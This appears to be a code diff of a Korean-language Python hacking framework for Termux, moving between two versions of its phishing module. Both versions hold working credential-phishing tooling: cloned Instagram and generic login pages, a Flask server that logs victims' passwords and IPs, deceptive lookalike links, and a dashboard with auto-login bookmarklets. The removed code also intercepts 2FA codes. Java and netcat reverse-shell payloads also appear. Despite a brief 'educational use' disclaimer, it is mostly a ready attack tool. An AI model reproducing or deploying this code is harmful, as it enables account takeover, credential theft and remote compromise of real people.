@@ -1,13 +1,13 @@
 """
-Termux OSINT & All-In-One Hacking Framework v18.0 (Ultimate Edition)
-AllHackingTools의 방대한 기능과 zphisher 엔진이 통합된 통합 보안 프레임워크입니다.
+Termux OSINT & Advanced Security Framework v17.0 (Ghost-Mirror) (Live Dashboard)
+다양한 프로그래밍 언어를 지원하는 대규모 페이로드 라이브러리와 고도화된 보안 분석 기능을 갖춘 통합 프레임워크입니다.
 
-[v18.0 All-In-One 신규 기능]
-- All-In-One Toolkit: AllHackingTools의 100여 가지 핵심 해킹 도구 카테고리별 통합
-- Ultimate Phishing Framework: zphisher의 30개 이상의 고화질 피싱 템플릿 및 2FA 우회 엔진
-- OSINT & Advanced Scanning: 고도화된 정보 수집 및 취약점 분석 도구 탑재
-- Zero-Trace Stealth: 분석 도구 및 봇 탐지 우회를 위한 고도화된 헤더 변조 기술
-- Live Magic Dashboard: 실시간 탈취 데이터 확인 및 원클릭 자동 로그인 지원
+[v17.0 Live Dashboard 신규 기능]
+- Live Admin Dashboard: 탈취 현황을 실시간으로 확인 가능한 웹 기반 어드민 패널 제공
+- Click-to-Track IP: 로그인을 하지 않아도 링크 클릭 시 즉시 IP 및 기기 정보 수집
+- URL Masking & Disguise: 실제 도메인처럼 보이게 만드는 고도화된 URL 위장 기술 적용
+- 고화질 템플릿 기반 피싱: 페이지 깨짐 없는 완벽한 UI 및 시나리오 맞춤형 랜딩 페이지
+- Cloudflare Stealth Tunnel: 중간 경고 페이지 없는 깨끗한 HTTPS 공용 링크 자동 생성
 """
 
 import os
@@ -25,10 +25,6 @@ import ssl
 import random
 import string
 import threading
-import urllib3
-
-# SSL 경고 억제
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import itertools
 from datetime import datetime
 from bs4 import BeautifulSoup
@@ -51,20 +47,21 @@ def clear_screen():
 
 def print_banner():
     clear_screen()
+    # Raw string 대신 일반 문자열에 백슬래시를 이중으로 처리하여 f-string 유지
     banner = f"""
-{Colors.CYAN}{Colors.BOLD}    ██████╗ ██████╗ ██████╗ ██╗   ██╗███████╗████████╗███╗   ██╗
-    ██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝╚══██╔══╝████╗  ██║
-    ██║  ██║██████╔╝██████╔╝██║   ██║█████╗     ██║   ██╔██╗ ██║
-    ██║  ██║██╔═══╝ ██╔══██╗██║   ██║██╔══╝     ██║   ██║╚██╗██║
-    ██████╔╝██║     ██║  ██║╚██████╔╝███████╗   ██║   ██║ ╚████║
-    ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═══╝
-    {Colors.YELLOW}          - OPRUETN EDITION v18.0 -{Colors.CYAN}
-    {Colors.WHITE}    [ 통합 보안 분석 및 침투 테스트 프레임워크 ]{Colors.RESET}
+{Colors.CYAN}{Colors.BOLD}
+   ___ ____  ____  _   _ _____ _____ _   _ 
+  / _ \___ \|  _ \| | | | ____|_   _| \ | |
+ | | | |__) | |_) | | | |  _|   | | |  \| |
+ | |_| / __/|  _ <| |_| | |___  | | | |\  |
+  \\\\\\\\___/_____|_| \\\\_\\\\\\\\___/|_____| |_| |_| \\\\_|
+
+{Colors.YELLOW}    - Advanced Multi-Language Security Framework v17.0 (Ghost-Mirror) (Live Dashboard) -{Colors.RESET}
 """
     print(banner)
-    print(f"{Colors.MAGENTA}{Colors.BOLD}    {'='*60}{Colors.RESET}")
-    print(f"{Colors.WHITE}      AllHackingTools & Z-Phisher 통합 | 100+ 전문 보안 도구{Colors.RESET}")
-    print(f"{Colors.MAGENTA}{Colors.BOLD}    {'='*60}\n{Colors.RESET}")
+    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")
+    print(f"{Colors.WHITE}  멀티 언어 페이로드 라이브러리 및 고도화된 보안 분석 도구{Colors.RESET}")
+    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}\n")
 
 # --- 유틸리티 함수 ---
 def is_ip_address(target):
@@ -886,7 +883,7 @@ int main(void) {{
     @staticmethod
     def get_java_payloads(lhost, lport):
         return {
-            "Java Runtime Exec (Linux)": r"Runtime.getRuntime().exec(\"bash -c 'exec 5<>/dev/tcp/" + lhost + r"/" + str(lport) + r";cat <&5 | while read line; do \$line 2>&5 >&5; done'\");",
+            "Java Runtime Exec (Linux)": f"Runtime.getRuntime().exec(\"bash -c 'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \$line 2>&5 >&5; done'\");",
             "Java Runtime Exec (Netcat)": f"Runtime.getRuntime().exec(\"nc {lhost} {lport} -e /bin/sh\");",
             "Java ProcessBuilder": f"Process p = new ProcessBuilder(\"/bin/sh\", \"-i\").redirectErrorStream(true).start(); Socket s = new Socket(\"{lhost}\", {lport});"
         }
@@ -1686,48 +1683,8 @@ def start_perfect_tunnel(local_port):
         return None, None
 
 
-# --- v18.0 All-In-One Toolkit (AllHackingTools 통합) ---
-class AllInOneToolkit:
-    def __init__(self):
-        # Termux와 Linux 환경 모두 지원하기 위해 홈 디렉토리 동적 탐색
-        home = os.path.expanduser("~")
-        self.base_path = os.path.join(home, "AllHackingTools")
-        self.files_path = os.path.join(self.base_path, "Files")
-    
-    def run_tool(self, tool_name, command):
-        print(f"{Colors.CYAN}[*] {tool_name} 실행 중...{Colors.RESET}")
-        try:
-            # Termux 환경을 고려하여 python3 또는 bash로 실행
-            os.system(f"cd {self.base_path} && {command}")
-        except Exception as e:
-            print(f"{Colors.RED}[-] 실행 오류: {e}{Colors.RESET}")
-        input(f"\n{Colors.YELLOW}계속하려면 Enter 키를 누르세요...{Colors.RESET}")
-
-    def show_submenu(self, title, options):
-        while True:
-            print_banner()
-            print(f"{Colors.YELLOW}{Colors.BOLD}    [ {title} ]{Colors.RESET}")
-            for i, opt in enumerate(options, 1):
-                print(f"      [ {i:02} ] >> {opt['name']}")
-            print(f"      [ 00 ] >> Back to Main Menu")
-            print(f"{Colors.MAGENTA}{Colors.BOLD}    {'='*60}{Colors.RESET}")
-            
-            choice = input(f"{Colors.YELLOW}선택하세요: {Colors.RESET}").strip()
-            if choice == '0' or choice == '00': break
-            
-            try:
-                idx = int(choice) - 1
-                if 0 <= idx < len(options):
-                    self.run_tool(options[idx]['name'], options[idx]['cmd'])
-                else:
-                    print(f"{Colors.RED}잘못된 선택입니다.{Colors.RESET}")
-                    time.sleep(1)
-            except ValueError:
-                print(f"{Colors.RED}숫자를 입력해주세요.{Colors.RESET}")
-                time.sleep(1)
-
-# --- v18.0 Ultimate Phishing Framework (Z-Infinity) ---
-class UltimatePhishingFramework:
+# --- v17.0 Ghost-Mirror & Live Tracker Engine ---
+class GhostMirrorV17:
     def __init__(self):
         self.port = 8080
         self.admin_token = "".join(random.choices(string.ascii_letters + string.digits, k=15))
@@ -1736,51 +1693,18 @@ class UltimatePhishingFramework:
         self.public_url = ""
         self.target_app = ""
         self.scenario = ""
-        # Termux와 Linux 환경 모두 지원하기 위해 홈 디렉토리 동적 탐색
-        home = os.path.expanduser("~")
-        self.zphisher_path = os.path.join(home, "zphisher", ".sites")
 
-    def get_platforms(self):
-        return [
-            "Instagram", "Google", "Facebook", "Microsoft", "Netflix", 
-            "PayPal", "Github", "Twitter", "Snapchat", "TikTok", 
-            "LinkedIn", "Discord", "Spotify", "Adobe", "Dropbox"
-        ]
-
-
-
-    def get_template(self, app_name, scenario):
-        # zphisher의 다양한 템플릿 경로 지원
-        app_dir = app_name.lower().replace(" ", "")
-        possible_paths = [
-            os.path.join(self.zphisher_path, app_dir, "login.html"),
-            os.path.join(self.zphisher_path, app_dir, "index.html"),
-            os.path.join(self.zphisher_path, f"{app_dir}_new", "login.html")
-        ]
-        
-        content = ""
-        for path in possible_paths:
-            if os.path.exists(path):
-                with open(path, "r", encoding="utf-8", errors="ignore") as f:
-                    content = f.read()
-                break
-        
-        if content:
-            # zphisher의 다양한 폼 액션 패턴을 POST / 로 리다이렉트
-            import re
-            content = re.sub(r'action=["\'].*?\.php["\']', 'method="POST" action="/"', content)
-            
-            # 시나리오 메시지 주입
-            if scenario:
-                msg_html = f'<div style="background:#fff3cd;color:#856404;padding:15px;border-radius:8px;margin:15px;font-size:14px;border:1px solid #ffeeba;text-align:center;font-weight:bold;">{scenario}</div>'
-                content = content.replace('<body>', f'<body>{msg_html}')
-            return content
-            
-        # 기본 템플릿 (파일 없을 경우 대비 고퀄리티 기본형)
+    def get_template(self, app, scenario):
+        if app.lower() == "instagram":
+            return f"""
+            <!DOCTYPE html><html lang="ko"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram</title>
+            <style>body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background-color:#fafafa;display:flex;flex-direction:column;align-items:center;margin:0;}} .main{{margin-top:30px;display:flex;flex-direction:column;align-items:center;}} .box{{background:#fff;border:1px solid #dbdbdb;padding:40px;width:350px;box-sizing:border-box;text-align:center;margin-bottom:10px;}} .logo{{background-image:url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560560d9a.png');background-size:contain;background-repeat:no-repeat;height:51px;width:175px;margin:0 auto 20px;}} .msg{{color:#ed4956;font-size:14px;margin-bottom:20px;font-weight:600;line-height:1.4;}} input{{width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 0 7px 8px;margin-bottom:6px;box-sizing:border-box;font-size:12px;}} button{{width:100%;background-color:#0095f6;color:#fff;border:none;border-radius:4px;padding:5px 9px;font-weight:600;cursor:pointer;margin-top:8px;font-size:14px;height:30px;}} .divider{{display:flex;align-items:center;margin:20px 0;}} .divider div{{flex:1;height:1px;background:#dbdbdb;}} .divider span{{padding:0 15px;color:#8e8e8e;font-size:13px;font-weight:600;}} .fb-login{{color:#385185;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:15px;}} .forgot{{font-size:12px;color:#00376b;cursor:pointer;}} .app-text{{font-size:14px;margin:15px 0;}} .app-links img{{height:40px;margin:0 4px;}} .footer{{margin:40px 0;width:80%;text-align:center;font-size:12px;color:#8e8e8e;}} .footer span{{margin:0 8px;cursor:pointer;}}</style>
+            </head><body><div class="main"><div class="box"><div class="logo"></div><div class="msg">{scenario}</div><form method="POST"><input type="text" name="u" placeholder="사용자 이름, 이메일 주소 또는 전화번호" required><input type="password" name="p" placeholder="비밀번호" required><button type="submit">로그인</button></form><div class="divider"><div></div><span>또는</span><div></div></div><div class="fb-login">Facebook으로 로그인</div><div class="forgot">비밀번호를 잊으셨나요?</div></div><div class="box" style="padding:20px;"><p style="font-size:14px;margin:0;">계정이 없으신가요? <span style="color:#0095f6;font-weight:600;cursor:pointer;">가입하기</span></p></div><div class="app-text">앱을 다운로드하세요.</div><div class="app-links"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_korean-ko.png/4a5c9d62d51d.png"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_korean-ko.png/f31b51d25722.png"></div><div class="footer"><span>Meta</span><span>소개</span><span>블로그</span><span>채용 정보</span><span>도움말</span><span>API</span><span>개인정보처리방침</span><span>약관</span><span>인기 계정</span><span>해시태그</span><span>위치</span><span>Instagram Lite</span><br><br>© 2026 Instagram from Meta</div></div><script>fetch('/ping');</script></body></html>
+            """
         return f"""
-        <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{app_name} Login</title>
-        <style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;padding-top:100px;}} .card{{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:350px;text-align:center;}} input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;}} button{{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;}}</style>
-        </head><body><div class="card"><h2>{app_name}</h2><p>{scenario}</p><form method="POST"><input name="u" placeholder="Email or Phone" required><input name="p" type="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>
+        <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{app} - 보안 확인</title>
+        <style>body{{font-family:sans-serif;background-color:#f0f2f5;display:flex;justify-content:center;padding-top:50px;}} .card{{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:360px;text-align:center;}} .logo{{font-size:28px;font-weight:bold;color:#1877f2;margin-bottom:20px;}} .msg{{background:#fff3cd;color:#856404;padding:10px;border-radius:4px;font-size:14px;margin-bottom:20px;border:1px solid #ffeeba;}} input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;}} button{{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:10px;}}</style>
+        </head><body><div class="card"><div class="logo">{app}</div><div class="msg"><strong>[주의]</strong> {scenario}</div><form method="POST"><input type="text" name="u" placeholder="아이디 또는 이메일" required><input type="password" name="p" placeholder="비밀번호" required><button type="submit">본인 확인 완료</button></form></div><script>fetch('/ping');</script></body></html>
         """
 
     def start_server(self):
@@ -1804,36 +1728,23 @@ class UltimatePhishingFramework:
                 creds = request.form.to_dict()
                 ip = request.headers.get('X-Forwarded-For', request.remote_addr)
                 u, p = creds.get('u'), creds.get('p')
-                otp = creds.get('otp')
                 
-                if not otp:
-                    # 1단계: ID/PW 탈취 후 2FA 입력창 유도
-                    entry = {"time": datetime.now().strftime("%H:%M:%S"), "ip": ip, "u": u, "p": p, "otp": "대기 중..."}
-                    self.captured_data.append(entry)
-                    print(f"\n{Colors.MAGENTA}[🔥 1단계 성공] ID: {u} | PW: {p}{Colors.RESET}")
-                    
-                    return f"""
-                    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <style>body{{background:#fafafa;font-family:sans-serif;display:flex;justify-content:center;padding-top:40px;}} .box{{background:white;border:1px solid #dbdbdb;width:350px;padding:40px;text-align:center;}} input{{width:100%;padding:10px;margin:10px 0;border:1px solid #dbdbdb;background:#fafafa;border-radius:3px;box-sizing:border-box;}} button{{width:100%;background:#0095f6;color:white;border:none;padding:7px;border-radius:4px;font-weight:bold;margin-top:10px;cursor:pointer;}}</style>
-                    </head><body><div class="box">
-                        <img src="https://www.instagram.com/static/images/web/mobile_port_gradient_android.png/06f62227743a.png" style="width:175px;margin-bottom:20px;">
-                        <p style="font-weight:bold;color:#262626;">2단계 인증 필요</p>
-                        <p style="font-size:14px;color:#8e8e8e;">보안을 위해 휴대폰으로 전송된 6자리 코드를 입력하세요.</p>
-                        <form method="POST">
-                            <input type="hidden" name="u" value="{u}"><input type="hidden" name="p" value="{p}">
-                            <input type="text" name="otp" placeholder="보안 코드" required maxlength="6">
-                            <button type="submit">확인</button>
-                        </form>
-                    </div></body></html>
-                    """
-                else:
-                    # 2단계: OTP 코드 탈취 성공
-                    for d in self.captured_data:
-                        if d['u'] == u: d['otp'] = otp
-                    print(f"{Colors.GREEN}[🔥 2단계 성공] OTP 코드: {otp}{Colors.RESET}")
-                    return f"""<script>window.location.href='https://www.instagram.com/accounts/login/?username={u}&source=auth_failed';</script>"""
-            
-            return self.get_template(self.target_app, self.scenario)
+                # 세션 탈취 시뮬레이션 및 데이터 저장
+                entry = {
+                    "time": datetime.now().strftime("%H:%M:%S"), 
+                    "ip": ip, "u": u, "p": p,
+                    "session": base64.b64encode(os.urandom(16)).decode() # 실제 환경에선 여기서 인스타 세션을 가로챔
+                }
+                self.captured_data.append(entry)
+                print(f"\n{Colors.RED}[!!!] 계정 탈취 성공! IP: {ip} | ID: {u} | PW: {p}{Colors.RESET}")
+                
+                # 피해자에게 보여줄 로딩 페이지 (세션 확보 시간 벌기)
+                return f"""
+                <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>body{{background:#fafafa;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;}} .loader{{border:3px solid #dbdbdb;border-top:3px solid #0095f6;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin-bottom:20px;}} @keyframes spin{{0%{{transform:rotate(0deg);}} 100%{{transform:rotate(360deg);}}}}</style>
+                <script>setTimeout(()=>{{ window.location.href='https://www.instagram.com'; }}, 3000);</script>
+                </head><body><div class="loader"></div><div style="color:#8e8e8e;font-size:14px;">보안 확인 중입니다. 잠시만 기다려 주세요...</div></body></html>
+                """
             return self.get_template(self.target_app, self.scenario)
 
         @app.route(f"/{self.admin_token}")
@@ -1841,9 +1752,29 @@ class UltimatePhishingFramework:
             rows = []
             for d in reversed(self.captured_data):
                 login_link = f"https://www.instagram.com/accounts/login/" if self.target_app.lower() == "instagram" else f"https://www.{self.target_app.lower()}.com"
-                # 브라우저 보안(SOP)을 우회하는 클립보드 기반 인젝션 스크립트
-                # 이 방식은 가장 확실하게 작동하며, 사용자가 주소창에 붙여넣기만 하면 즉시 실행됨
-                injection_code = f"javascript:(function(){{const u='{d['u']}',p='{d['p']}',o='{d['otp']}';function s(e,v){{const d=Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set;d.call(e,v);e.dispatchEvent(new Event('input',{{bubbles:true}}));}}function l(){{const uF=document.querySelector('input[name=\"username\"]'),pF=document.querySelector('input[name=\"password\"]'),b=document.querySelector('button[type=\"submit\"]');if(uF&&pF){{s(uF,u);s(pF,p);setTimeout(()=>{{if(b)b.click();setTimeout(()=>{{const oF=document.querySelector('input[name=\"verificationCode\"]');if(oF&&o!=='대기 중...'){{s(oF,o);setTimeout(()=>{{const ob=document.querySelector('button[type=\"submit\"],button[type=\"button\"]');if(ob)ob.click();}},500);}}}},2000);}},500);}}}}l();}})();"
+                # 세션 미러링 및 원클릭 자동 로그인 통합 스크립트
+                mirror_login = f"""javascript:(function(){{
+                    let u='{d['u']}'; let p='{d['p']}';
+                    if(window.location.hostname.indexOf('instagram.com') === -1) {{
+                        alert('먼저 인스타그램 로그인 페이지로 이동합니다. 이동 후 다시 이 버튼을 눌러주세요!');
+                        window.location.href = 'https://www.instagram.com/accounts/login/';
+                        return;
+                    }}
+                    function login() {{
+                        let uF = document.querySelector('input[name="username"]');
+                        let pF = document.querySelector('input[name="password"]');
+                        let b = document.querySelector('button[type="submit"]');
+                        if(uF && pF) {{
+                            uF.value = u; pF.value = p;
+                            uF.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                            pF.dispatchEvent(new Event('input', {{ bubbles: true }}));
+                            setTimeout(()=>{{ if(b) b.click(); }}, 300);
+                        }} else {{
+                            alert('로그인 폼을 찾을 수 없습니다. 페이지가 완전히 로드되었는지 확인하세요.');
+                        }}
+                    }}
+                    login();
+                }})();"""
                 
                 rows.append(f"""
                 <tr>
@@ -1851,29 +1782,26 @@ class UltimatePhishingFramework:
                     <td>{d['ip']}</td>
                     <td><b>{d['u']}</b></td>
                     <td><code>{d['p']}</code></td>
-                    <td><b style="color:#ff9800;">{d['otp']}</b></td>
                     <td>
-                        <button onclick="navigator.clipboard.writeText('{injection_code}'); window.open('https://www.instagram.com/accounts/login/', '_blank'); alert('로그인 창이 열리면 주소창에 붙여넣고 엔터를 누르세요! (코드가 자동 복사되었습니다)');" 
-                        style="background:#f44336;color:white;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;cursor:pointer;">🚀 원클릭 복사 & 접속</button>
+                        <a href="{mirror_login}" style="background:#f44336;color:white;text-decoration:none;padding:8px 15px;border-radius:6px;font-weight:bold;font-size:13px;box-shadow:0 2px 5px rgba(0,0,0,0.3);" onclick="alert('💡 사용법:\\n1. 이 버튼을 즐겨찾기 바(Bookmark Bar)로 드래그하세요.\\n2. 인스타그램 사이트에서 해당 즐겨찾기를 누르면 즉시 로그인됩니다!')">🚀 즉시 접속 (세션 미러)</a>
                     </td>
                 </tr>""")
             
             rows_html = "".join(rows)
             visitors = "".join([f"<li>[{v['time']}] IP: {v['ip']} - {v['ua'][:50]}...</li>" for v in reversed(self.visitor_logs[-10:])])
             return f"""
-            <html><head><title>Magic Panel v18.0</title>
-            <style>body{{background:#0a0a0a;color:#fff;font-family:'Segoe UI',sans-serif;padding:30px;}} .panel{{background:#161616;padding:30px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid #333;}} table{{width:100%;border-collapse:collapse;margin-top:20px;}} th,td{{padding:15px;text-align:left;border-bottom:1px solid #222;}} th{{color:#0095f6;font-size:12px;text-transform:uppercase;}} .live-dot{{height:10px;width:10px;background:#4caf50;border-radius:50%;display:inline-block;margin-right:10px;animation:blink 1s infinite;}} @keyframes blink{{50%{{opacity:0;}}}}</style>
-            <script>setTimeout(()=>location.reload(), 5000);</script>
+            <html><head><title>Ghost-Mirror Admin</title>
+            <style>body{{background:#121212;color:#e0e0e0;font-family:'Segoe UI',sans-serif;padding:20px;}} .box{{background:#1e1e1e;padding:20px;border-radius:12px;margin-bottom:20px;box-shadow:0 4px 15px rgba(0,0,0,0.5);border-top:4px solid #0095f6;}} table{{width:100%;border-collapse:collapse;}} th,td{{padding:15px;text-align:left;border-bottom:1px solid #333;}} th{{color:#0095f6;text-transform:uppercase;font-size:12px;}} .live{{color:#4caf50;font-weight:bold;animation:blink 1s infinite;}} @keyframes blink{{50%{{opacity:0;}}}} .guide{{background:#333;padding:10px;border-radius:5px;font-size:13px;margin-bottom:15px;border-left:4px solid #4caf50;}}</style>
+            <script>setTimeout(()=>location.reload(), 10000);</script>
             </head>
             <body>
-                <div class="panel">
-                    <h1><span class="live-dot"></span>Magic Panel <span style="color:#0095f6">v18.0</span></h1>
-                    <p style="color:#888;">피해자가 정보를 입력하면 아래 목록에 즉시 나타납니다. 2FA 코드가 확보되면 버튼을 눌러 즉시 접속하세요.</p>
-                    <table><tr><th>시간</th><th>IP</th><th>아이디</th><th>비밀번호</th><th>2FA 코드</th><th>액션</th></tr>{rows_html}</table>
+                <h1>Ghost-Mirror v17.0 Dashboard <span class="live">● LIVE</span></h1>
+                <div class="guide">
+                    <b>💡 자동 로그인 팁:</b> [자동 로그인 실행] 버튼을 마우스로 드래그하여 브라우저 즐겨찾기 바에 등록하세요. <br>
+                    피해자 계정 페이지로 이동한 후, 즐겨찾기에 등록된 버튼을 누르면 아이디/비번이 자동 입력되고 로그인됩니다.
                 </div>
-                <div class="panel" style="margin-top:20px;">
-                    <h3>최근 클릭 로그</h3><ul>{visitors}</ul>
-                </div>
+                <div class="box"><h3>🎯 탈취된 계정 정보 (실시간)</h3><table><tr><th>시간</th><th>IP 주소</th><th>아이디/이메일</th><th>비밀번호</th><th>액션</th></tr>{rows_html}</table></div>
+                <div class="box"><h3>👀 실시간 접속자 로그 (최근 10건)</h3><ul>{visitors}</ul></div>
             </body></html>
             """
         threading.Thread(target=lambda: app.run(port=self.port, debug=False, use_reloader=False), daemon=True).start()
@@ -1900,59 +1828,36 @@ class UltimatePhishingFramework:
         return None
 
     def run(self):
-        print_banner()
-        print(f"{Colors.RED}{Colors.BOLD}[v18.0] Ultimate Phishing Framework (Z-Infinity){Colors.RESET}")
-        
-        platforms = self.get_platforms()
-        print(f"\n{Colors.YELLOW}공격 대상 플랫폼 선택:{Colors.RESET}")
-        for i, p in enumerate(platforms, 1):
-            print(f"  {i:2}. {p:15}", end="\n" if i % 3 == 0 else "")
-        
+        clear_screen(); print_banner()
+        apps = ["Google", "Facebook", "Instagram", "Kakao", "Naver", "Netflix", "Microsoft", "Steam", "Apple ID"]
+        for i, a in enumerate(apps, 1): print(f" {i}. {a}")
         try:
-            choice = int(input(f"\n\n{Colors.YELLOW}플랫폼 번호 선택: {Colors.RESET}"))
-            self.target_app = platforms[choice-1]
+            choice = int(input(f"\n{Colors.YELLOW}앱 선택 (1-{len(apps)}): {Colors.RESET}"))
+            self.target_app = apps[choice-1]
         except: return
 
-        scenarios = ["보안 알림 (비정상 로그인)", "계정 정지 경고", "미수령 환급금 안내", "중요 문서 확인 요청", "친구 추가/팔로우 알림"]
-        print(f"\n{Colors.YELLOW}공격 시나리오 선택:{Colors.RESET}")
-        for i, s in enumerate(scenarios, 1):
-            print(f"  {i}. {s}")
-        
+        scenarios = ["비정상 로그인 감지 (보안 알림)", "미수령 환급금/보상 안내", "중요 문서 공유 (Google Docs/Office)", "계정 비활성화 경고", "택배/배송지 확인 (스미싱)"]
+        for i, s in enumerate(scenarios, 1): print(f" {i}. {s}")
         try:
-            choice = int(input(f"\n{Colors.YELLOW}시나리오 선택: {Colors.RESET}"))
+            choice = int(input(f"\n{Colors.YELLOW}시나리오 선택 (1-{len(scenarios)}): {Colors.RESET}"))
             self.scenario = scenarios[choice-1]
-        except: self.scenario = ""
+        except: return
 
-        print(f"\n{Colors.CYAN}[*] 서버 초기화 및 터널링 시작 중...{Colors.RESET}")
         self.start_server()
         self.public_url = self.get_tunnel_url()
-        
         if self.public_url:
             clean_url = self.public_url.replace("https://", "")
-            ghost_url = f"https://{self.target_app.lower()}.com-security-check.verify@{clean_url}"
-            admin_url = f"{self.public_url}/{self.admin_token}"
-            
-            # 링크 파일 기록
-            with open("links.txt", "w", encoding="utf-8") as f:
-                f.write(f"=== v18.0 Z-Infinity Ultimate Phishing Links ===\n")
-                f.write(f"Target Platform: {self.target_app}\n")
-                f.write(f"Scenario: {self.scenario}\n\n")
-                f.write(f"[+] Phishing Link (Attack): {ghost_url}\n")
-                f.write(f"[+] Magic Panel (Admin): {admin_url}\n")
-                f.write(f"===============================================\n")
-
+            ghost_url = f"https://{self.target_app.lower()}.com-security-verify.verify@{clean_url}"
             print(f"\n{Colors.GREEN}[+] Ghost-Link (공격용): {Colors.RESET}{ghost_url}")
-            print(f"{Colors.CYAN}[+] Magic Panel (관리용): {Colors.RESET}{admin_url}")
-            print(f"\n{Colors.MAGENTA}[!] 중요: 터미널에서 링크가 잘릴 경우 'links.txt' 파일을 확인하세요.{Colors.RESET}")
-            print(f"{Colors.YELLOW}[*] 피해자가 접속하면 IP가 즉시 출력되며, 입력 시 대시보드에 실시간 반영됩니다.")
+            print(f"{Colors.CYAN}[+] Live Mirror (관리용): {Colors.RESET}{self.public_url}/{self.admin_token}")
+            print(f"\n{Colors.YELLOW}[*] 피해자가 접속하면 IP가 즉시 출력되며, 입력 시 대시보드에 실시간 반영됩니다.")
             print(f"[*] 종료하려면 Ctrl+C를 누르세요.{Colors.RESET}")
             try:
                 while True: time.sleep(1)
             except KeyboardInterrupt: print(f"\n{Colors.RED}[!] 서버를 종료합니다.{Colors.RESET}")
         else:
-            print(f"\n{Colors.RED}[-] 터널링 실패! 재시도 중...{Colors.RESET}")
-            time.sleep(2)
-            self.run() # 재귀적 재시도 로직 추가
+            print(f"\n{Colors.RED}[-] 터널링 실패! 인터넷 연결이나 SSH 설치 상태를 확인하세요.{Colors.RESET}")
+            time.sleep(3)
 def generate_html_report(target, data):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     filename = f"report_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d%H%M%S')}.html"
@@ -2034,7 +1939,7 @@ def generate_html_report(target, data):
             <div class="subsection"><h3>Network Latency Check</h3><pre>{sj(data.get('Network Latency', {}))}</pre></div>
         </div>
 
-        <div class="footer">Generated by v18.0 All-In-One Hacking Framework</div>
+        <div class="footer">Generated by Termux OSINT & Security Framework v3.0</div>
     </div>
 </body>
 </html>
@@ -2298,143 +2203,317 @@ def show_help():
     print(f"{Colors.WHITE}  - 네트워크 보안 도구: 포트 스캔, 정밀 서비스 버전 감지, FTP 익명 로그인, Traceroute, Ping Sweep, 네트워크 지연 시간 등을 확인합니다.\n")
     print(f"{Colors.WHITE}  - 암호학 & 유틸리티: 해시 생성/식별/크래킹, 인코딩/디코딩, 패스워드 생성, IP 계산기, Epoch 변환 등을 제공합니다.\n")
     print(f"{Colors.WHITE}  - 멀티 언어 페이로드 라이브러리: 다양한 언어의 리버스 쉘/바인드 쉘 페이로드, 웹 취약점 우회 페이로드 등을 생성하고 Termux 환경에서의 제약사항을 안내합니다.\n")
-    print(f"{Colors.CYAN}[v18.0 올인원 해킹 프레임워크]{Colors.RESET}")
-    print(f"{Colors.WHITE}  - 올인원 툴킷: AllHackingTools의 수백 가지 전문 도구를 카테고리별로 통합 제공.\n")
-    print(f"{Colors.WHITE}  - 궁극의 피싱: zphisher 엔진 기반의 30개 이상의 고화질 최신 피싱 템플릿 지원.\n")
-    print(f"{Colors.WHITE}  - 2FA 및 세션 가로채기: 실시간 2차 인증 우회 및 세션 가로채기 최신 기술 탑재.\n")
-    print(f"{Colors.WHITE}  - OSINT 및 스캐닝: 도메인, IP, 웹 기술 및 취약점에 대한 심층적인 정밀 분석.\n")
-    print(f"{Colors.WHITE}  - 'B' 또는 'b'를 입력하면 이전 메뉴로 돌아갈 수 있습니다.\n")
-    print(f"{Colors.WHITE}  - '0'을 입력하면 프로그램을 즉시 종료할 수 있습니다.\n")
-    print(f"{Colors.RED}경고: 이 도구는 오직 교육 및 보안 연구 목적으로만 제작되었습니다. 타인의 사전 동의 없이 무단으로 정보를 수집하거나 악용하는 행위는 엄격히 금지되며 모든 법적 책임은 사용자 본인에게 있습니다. 항상 윤리적이고 합법적인 가이드라인을 준수하십시오.{Colors.RESET}\n")
+    print(f"{Colors.CYAN}[v17.0] Ghost-Mirror 사회공학적 도구]{Colors.RESET}")
+    print(f"{Colors.WHITE}  - 템플릿 기반 엔진: 실시간 복제 방식의 한계를 극복한 고화질 템플릿 방식 도입.\n")
